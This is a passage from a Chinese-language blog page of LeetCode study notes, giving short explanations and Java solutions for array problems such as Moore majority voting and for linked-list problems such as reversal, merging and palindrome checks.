</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minMoves2</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">0</span>,j=nums.length-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;j)</span><br><span class="line">        &#123;</span><br><span class="line">            res+=nums[j--]-nums[i++];</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-数组中出现次数多于-n-2-的元素"><a class="markdownIt-Anchor" href="#9-数组中出现次数多于-n-2-的元素"></a> 9. 数组中出现次数多于 n / 2 的元素</h3><p>  <a href="https://leetcode-cn.com/problems/majority-element/">https://leetcode-cn.com/problems/majority-element/</a></p><h4 id="思路-72"><a class="markdownIt-Anchor" href="#思路-72"></a> 思路</h4><p>  有两种解决方式，一种是简单的，将数组排序，排序之后的中位数一定是超过半数的元素。<br />  另一种是利用数学思想，这里用到了摩尔投票算法(Moore majority vote algorithm)。<br />  摩尔投票算法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">摩尔投票法的基本思想很简单，在每一轮投票过程中，从数组中找出一对不同的元素，将其从数组中删除。这样不断的删除直到无法再进行投票，如果数组为空，则没有任何元素出现的次数超过该数组长度的一半。如果只存在一种元素，那么这个元素则可能为目标元素。</span><br></pre></td></tr></table></figure><p>  在这道题中，我们从数组头部开始遍历，用一个数来做计数器。<br />  取一个标记数，从下一个数开始遍历，如果相同，让计数器+1，来统计一下先前有多少个一样的标记数。<br />  如果不同，让计数器-1，代表我们从数组中删除了一对这样的数。<br />  如果计数器到0了，说明先前遍历的部分已经让我们删光了，我们要取一个新的标记数。<br />  最后剩下的标记数，一定是所需的目标元素。</p><blockquote><p>而且用摩尔投票法可以解决一般性的频率最高数的问题，而无需一定要大于n/2。</p></blockquote><h4 id="代码-70"><a class="markdownIt-Anchor" href="#代码-70"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">majorityElement</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums==<span class="keyword">null</span>||nums.length==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> flag=nums[<span class="number">0</span>],count=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;nums.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(flag==nums[i])</span><br><span class="line">                count++;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                count--;</span><br><span class="line">                <span class="keyword">if</span>(count==<span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    flag=nums[i];</span><br><span class="line">                    count=<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-平方数"><a class="markdownIt-Anchor" href="#10-平方数"></a> 10. 平方数</h3><p>  <a href="https://leetcode-cn.com/problems/valid-perfect-square/">https://leetcode-cn.com/problems/valid-perfect-square/</a></p><h4 id="思路-73"><a class="markdownIt-Anchor" href="#思路-73"></a> 思路</h4><p>  数学定理：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">完全平方数是一系列奇数之和</span><br><span class="line">1 &#x3D; 1</span><br><span class="line">4 &#x3D; 1 + 3</span><br><span class="line">9 &#x3D; 1 + 3 + 5</span><br><span class="line">16 &#x3D; 1 + 3 + 5 + 7</span><br><span class="line">25 &#x3D; 1 + 3 + 5 + 7 + 9</span><br><span class="line">36 &#x3D; 1 + 3 + 5 + 7 + 9 + 11</span><br><span class="line">....</span><br><span class="line">1+3+...+(2n-1) &#x3D; (2n-1 + 1)n&#x2F;2 &#x3D; n*n</span><br></pre></td></tr></table></figure><h4 id="代码-71"><a class="markdownIt-Anchor" href="#代码-71"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPerfectSquare</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;num&gt;=<span class="number">0</span>;i+=<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(num==<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            num-=i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="11-3-的-n-次方"><a class="markdownIt-Anchor" href="#11-3-的-n-次方"></a> 11. 3 的 n 次方</h3><p>  <a href="https://leetcode-cn.com/problems/power-of-three/">https://leetcode-cn.com/problems/power-of-three/</a></p><h4 id="思路-74"><a class="markdownIt-Anchor" href="#思路-74"></a> 思路</h4><p>  通用方法是不断地/3,看会不会到1。<br />  数学思想的方法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3的幂次的质因子只有3，题目整数范围内的3的最大幂次是1162261467。</span><br><span class="line">如果N是3的幂次，那么N一定是1162261467的因子，如果不是，那么也就不是因子。</span><br></pre></td></tr></table></figure><h4 id="代码-72"><a class="markdownIt-Anchor" href="#代码-72"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通用方法</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPowerOfThree</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(n&lt;=<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">while</span>(n%<span class="number">3</span>==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(n/<span class="number">3</span>==<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            n/=<span class="number">3</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//数学思想</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPowerOfThree</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> n &gt; <span class="number">0</span> &amp;&amp; (<span class="number">1162261467</span> % n == <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="12-乘积数组"><a class="markdownIt-Anchor" href="#12-乘积数组"></a> 12. 乘积数组</h3><p>  <a href="https://leetcode-cn.com/problems/product-of-array-except-self/">https://leetcode-cn.com/problems/product-of-array-except-self/</a></p><h4 id="思路-75"><a class="markdownIt-Anchor" href="#思路-75"></a> 思路</h4><p>  因为不能用除法，所以不能求总乘积再除。</p><p>  故选用一个数组，从左向右遍历一次，output[i]保存output[i]左侧所有数的乘积。<br />  从右向左遍历一次，output[i]再乘上右侧所有数的乘积。</p><p>  两次遍历之后，output就存下了所需的内容。</p><h4 id="代码-73"><a class="markdownIt-Anchor" href="#代码-73"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] productExceptSelf(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">        <span class="keyword">if</span>(nums==<span class="keyword">null</span>||nums.length==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">int</span>[] output=<span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line">        <span class="keyword">int</span> left=<span class="number">1</span>,right=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            output[i]=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            output[i]=left;</span><br><span class="line">            left*=nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=nums.length-<span class="number">1</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">        &#123;</span><br><span class="line">            output[i]*=right;</span><br><span class="line">            right*=nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> output;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="13-找出数组中的乘积最大的三个数"><a class="markdownIt-Anchor" href="#13-找出数组中的乘积最大的三个数"></a> 13. 找出数组中的乘积最大的三个数</h3><p>  <a href="https://leetcode-cn.com/problems/maximum-product-of-three-numbers/">https://leetcode-cn.com/problems/maximum-product-of-three-numbers/</a></p><h4 id="思路-76"><a class="markdownIt-Anchor" href="#思路-76"></a> 思路</h4><p>  先排序，然后最大值只会有两种情况：</p><ol><li>最大的三个正数乘积。</li><li>最大的一个正数和最小的两个负数乘积。</li></ol><h4 id="代码-74"><a class="markdownIt-Anchor" href="#代码-74"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maximumProduct</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="keyword">int</span> n=nums.length;</span><br><span class="line">        <span class="keyword">return</span> Math.max(nums[n-<span class="number">1</span>]*nums[n-<span class="number">2</span>]*nums[n-<span class="number">3</span>],nums[<span class="number">0</span>]*nums[<span class="number">1</span>]*nums[n-<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="第二部分-数据结构相关"><a class="markdownIt-Anchor" href="#第二部分-数据结构相关"></a> 第二部分 数据结构相关</h1><h2 id="一-链表"><a class="markdownIt-Anchor" href="#一-链表"></a> 一、链表</h2><h3 id="1-找出两个链表的交点"><a class="markdownIt-Anchor" href="#1-找出两个链表的交点"></a> 1. 找出两个链表的交点</h3><p>  <a href="https://leetcode-cn.com/problems/intersection-of-two-linked-lists/">https://leetcode-cn.com/problems/intersection-of-two-linked-lists/</a></p><h4 id="思路-77"><a class="markdownIt-Anchor" href="#思路-77"></a> 思路</h4><p>  两个单链表一定有共同的尾部，所以差异只是在前面，只要找到前面差的长度，然后补全差异之后同时向后走就可以找到交点。</p><p>  CYC用A的链表接上B，B的链表接上A，这样就不用手动寻找长度差异了。</p><h4 id="代码-75"><a class="markdownIt-Anchor" href="#代码-75"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">getIntersectionNode</span><span class="params">(ListNode headA, ListNode headB)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> Alength=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> Blength=<span class="number">0</span>;</span><br><span class="line">        ListNode temp=<span class="keyword">null</span>;</span><br><span class="line">        temp=headA;</span><br><span class="line">        <span class="keyword">while</span>(temp!=<span class="keyword">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Alength++;</span><br><span class="line">            temp=temp.next;</span><br><span class="line">        &#125;</span><br><span class="line">        temp=headB;</span><br><span class="line">        <span class="keyword">while</span>(temp!=<span class="keyword">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Blength++;</span><br><span class="line">            temp=temp.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> diff=Alength-Blength;</span><br><span class="line">        <span class="keyword">while</span>(diff&gt;<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            headA=headA.next;</span><br><span class="line">            diff--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(diff&lt;<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            headB=headB.next;</span><br><span class="line">            diff++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(headA!=headB)</span><br><span class="line">        &#123;</span><br><span class="line">            headA=headA.next;</span><br><span class="line">            headB=headB.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> headA;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//CYC</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">getIntersectionNode</span><span class="params">(ListNode headA, ListNode headB)</span> </span>&#123;</span><br><span class="line">    ListNode l1 = headA, l2 = headB;</span><br><span class="line">    <span class="keyword">while</span> (l1 != l2) &#123;</span><br><span class="line">        l1 = (l1 == <span class="keyword">null</span>) ? headB : l1.next;</span><br><span class="line">        l2 = (l2 == <span class="keyword">null</span>) ? headA : l2.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-链表反转"><a class="markdownIt-Anchor" href="#2-链表反转"></a> 2. 链表反转</h3><p>  <a href="https://leetcode-cn.com/problems/reverse-linked-list/">https://leetcode-cn.com/problems/reverse-linked-list/</a></p><h4 id="思路-78"><a class="markdownIt-Anchor" href="#思路-78"></a> 思路</h4><p>  头部插入</p><h4 id="代码-76"><a class="markdownIt-Anchor" href="#代码-76"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">reverseList</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        ListNode tail=<span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">while</span>(head!=<span class="keyword">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ListNode temp=head;</span><br><span class="line">            head=head.next;</span><br><span class="line">            temp.next=tail;</span><br><span class="line">            tail=temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> tail;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-归并两个有序的链表"><a class="markdownIt-Anchor" href="#3-归并两个有序的链表"></a> 3. 归并两个有序的链表</h3><p>  <a href="https://leetcode-cn.com/problems/merge-two-sorted-lists/">https://leetcode-cn.com/problems/merge-two-sorted-lists/</a></p><h4 id="思路-79"><a class="markdownIt-Anchor" href="#思路-79"></a> 思路</h4><p>  类似归并</p><h4 id="代码-77"><a class="markdownIt-Anchor" href="#代码-77"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">mergeTwoLists</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line">        ListNode head=<span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        ListNode newlink=head;</span><br><span class="line">        <span class="keyword">while</span>(l1!=<span class="keyword">null</span>||l2!=<span class="keyword">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(l1==<span class="keyword">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                newlink.next=l2;</span><br><span class="line">                <span class="keyword">return</span> head.next; </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">if</span>(l2==<span class="keyword">null</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    newlink.next=l1;</span><br><span class="line">                    <span class="keyword">return</span> head.next;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(l1.val&gt;l2.val)</span><br><span class="line">                &#123;</span><br><span class="line">                    newlink.next=l2;</span><br><span class="line">                    newlink=newlink.next;</span><br><span class="line">                    l2=l2.next;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    newlink.next=l1;</span><br><span class="line">                    newlink=newlink.next;</span><br><span class="line">                    l1=l1.next;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-从有序链表中删除重复节点"><a class="markdownIt-Anchor" href="#4-从有序链表中删除重复节点"></a> 4. 从有序链表中删除重复节点</h3><p>  <a href="https://leetcode-cn.com/problems/remove-duplicates-from-sorted-list/">https://leetcode-cn.com/problems/remove-duplicates-from-sorted-list/</a></p><h4 id="思路-80"><a class="markdownIt-Anchor" href="#思路-80"></a> 思路</h4><p>  一次遍历</p><h4 id="代码-78"><a class="markdownIt-Anchor" href="#代码-78"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">deleteDuplicates</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        ListNode res=head;</span><br><span class="line">        <span class="keyword">while</span>(res!=<span class="keyword">null</span>&amp;&amp;res.next!=<span class="keyword">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(res.val==res.next.val)</span><br><span class="line">                res.next=res.next.next;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                res=res.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-删除链表的倒数第-n-个节点"><a class="markdownIt-Anchor" href="#5-删除链表的倒数第-n-个节点"></a> 5. 删除链表的倒数第 n 个节点</h3><p>  <a href="https://leetcode-cn.com/problems/remove-nth-node-from-end-of-list/">https://leetcode-cn.com/problems/remove-nth-node-from-end-of-list/</a></p><h4 id="思路-81"><a class="markdownIt-Anchor" href="#思路-81"></a> 思路</h4><p>  为了不进行两次遍历，可以用快慢指针，让快指针先走N步，在快指针到结尾时慢指针即是要删除的节点。<br />  如果快指针走到了尾部，说明要删除的是头结点，直接返回head.next即可。</p><h4 id="代码-79"><a class="markdownIt-Anchor" href="#代码-79"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">removeNthFromEnd</span><span class="params">(ListNode head, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="keyword">null</span>||head.next==<span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        ListNode fast=head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            fast=fast.next;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode slow=head;</span><br><span class="line">        <span class="keyword">if</span>(fast==<span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> head.next;</span><br><span class="line">        <span class="keyword">while</span>(fast.next!=<span class="keyword">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            fast=fast.next;</span><br><span class="line">            slow=slow.next;</span><br><span class="line">        &#125;</span><br><span class="line">        slow.next=slow.next.next;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-交换链表中的相邻结点"><a class="markdownIt-Anchor" href="#6-交换链表中的相邻结点"></a> 6. 交换链表中的相邻结点</h3><p>  <a href="https://leetcode-cn.com/problems/swap-nodes-in-pairs/">https://leetcode-cn.com/problems/swap-nodes-in-pairs/</a></p><h4 id="思路-82"><a class="markdownIt-Anchor" href="#思路-82"></a> 思路</h4><p>  两两交换，交换之后跳过一个。<br />  为了交换需要之前前一个节点的指针，故建立一个先导节点。</p><h4 id="代码-80"><a class="markdownIt-Anchor" href="#代码-80"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">swapPairs</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        ListNode beforehead=<span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        beforehead.next=head;</span><br><span class="line">        ListNode temp=<span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line">        ListNode p=beforehead;</span><br><span class="line">        <span class="keyword">while</span>(p.next!=<span class="keyword">null</span>&amp;&amp;p.next.next!=<span class="keyword">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(count==<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                count=<span class="number">0</span>;</span><br><span class="line">                p=p.next.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                count++;</span><br><span class="line">                temp=p.next.next;</span><br><span class="line">                p.next.next=p.next.next.next;</span><br><span class="line">                temp.next=p.next;</span><br><span class="line">                p.next=temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> beforehead.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-链表求和"><a class="markdownIt-Anchor" href="#7-链表求和"></a> 7. 链表求和</h3><p>  <a href="https://leetcode-cn.com/problems/add-two-numbers-ii/">https://leetcode-cn.com/problems/add-two-numbers-ii/</a></p><h4 id="思路-83"><a class="markdownIt-Anchor" href="#思路-83"></a> 思路</h4><p>  用栈来反转链表，然后倒序计算构建新链表。</p><h4 id="代码-81"><a class="markdownIt-Anchor" href="#代码-81"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">addTwoNumbers</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line">        Stack&lt;Integer&gt; l1Stack = buildStack(l1);</span><br><span class="line">        Stack&lt;Integer&gt; l2Stack = buildStack(l2);</span><br><span class="line">        ListNode head = <span class="keyword">new</span> ListNode(-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (!l1Stack.isEmpty() || !l2Stack.isEmpty() || carry != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> x = l1Stack.isEmpty() ? <span class="number">0</span> : l1Stack.pop();</span><br><span class="line">            <span class="keyword">int</span> y = l2Stack.isEmpty() ? <span class="number">0</span> : l2Stack.pop();</span><br><span class="line">            <span class="keyword">int</span> sum = x + y + carry;</span><br><span class="line">            ListNode node = <span class="keyword">new</span> ListNode(sum % <span class="number">10</span>);</span><br><span class="line">            node.next = head.next;</span><br><span class="line">            head.next = node;</span><br><span class="line">            carry = sum / <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head.next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Stack&lt;Integer&gt; <span class="title">buildStack</span><span class="params">(ListNode l)</span> </span>&#123;</span><br><span class="line">        Stack&lt;Integer&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">        <span class="keyword">while</span> (l != <span class="keyword">null</span>) &#123;</span><br><span class="line">            stack.push(l.val);</span><br><span class="line">            l = l.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stack;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-回文链表"><a class="markdownIt-Anchor" href="#8-回文链表"></a> 8. 回文链表</h3><p>  <a href="https://leetcode-cn.com/problems/palindrome-linked-list/">https://leetcode-cn.com/problems/palindrome-linked-list/</a></p><h4 id="思路-84"><a class="markdownIt-Anchor" href="#思路-84"></a> 思路</h4><p>  快慢指针，2倍速前进，获得中点，截断反转，同步判断。</p><h4 id="代码-82"><a class="markdownIt-Anchor" href="#代码-82"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPalindrome</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">         <span class="keyword">if</span> (head == <span class="keyword">null</span> || head.next == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode fast=head;</span><br><span class="line">        ListNode slow=head;</span><br><span class="line">        <span class="keyword">while</span>(fast.next!=<span class="keyword">null</span>&amp;&amp;fast.next.next!=<span class="keyword">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            slow=slow.next;</span><br><span class="line">            fast=fast.next.next;</span><br><span class="line">        &#125;</span><br><span class="line">        slow=reverse(slow.next);</span><br><span class="line">        <span class="keyword">while</span>(slow!=<span class="keyword">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(head.val!=slow.val)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            head=head.next;</span><br><span class="line">            slow=slow.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> ListNode <span class="title">reverse</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        ListNode newHead = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">while</span> (head != <span class="keyword">null</span>) &#123;</span><br><span class="line">            ListNode nextNode = head.next;</span><br><span class="line">            head.next = newHead;</span><br><span class="line">            newHead = head;</span><br><span class="line">            head = nextNode;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> newHead;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-分隔链表"><a class="markdownIt-Anchor" href="#9-分隔链表"></a> 9. 分隔链表</h3><p>  <a href="https://leetcode-cn.com/problems/split-linked-list-in-parts/">https://leetcode-cn.com/problems/split-linked-list-in-parts/</a></p><h3 id="思路-85"><a class="markdownIt-Anchor" href="#思路-85"></a> 思路</h3><p>  先遍历求一次链表长度N，然后因为要分隔K段，所以每段长度为N/k,多余的节点数为N%K,把这个N%K个节点给前N%K段每段的长度+1即可。</p><h3 id="代码-83"><a class="markdownIt-Anchor" href="#代码-83"></a> 代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode[] splitListToParts(ListNode root, <span class="keyword">int</span> k) &#123;</span><br><span class="line">        <span class="keyword">int</span> N = <span class="number">0</span>;</span><br><span class="line">        ListNode cur = root;</span><br><span class="line">        <span class="keyword">while</span> (cur != <span class="keyword">null</span>) &#123;</span><br><span class="line">            N++;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> mod = N % k;</span><br><span class="line">        <span class="keyword">int</span> size = 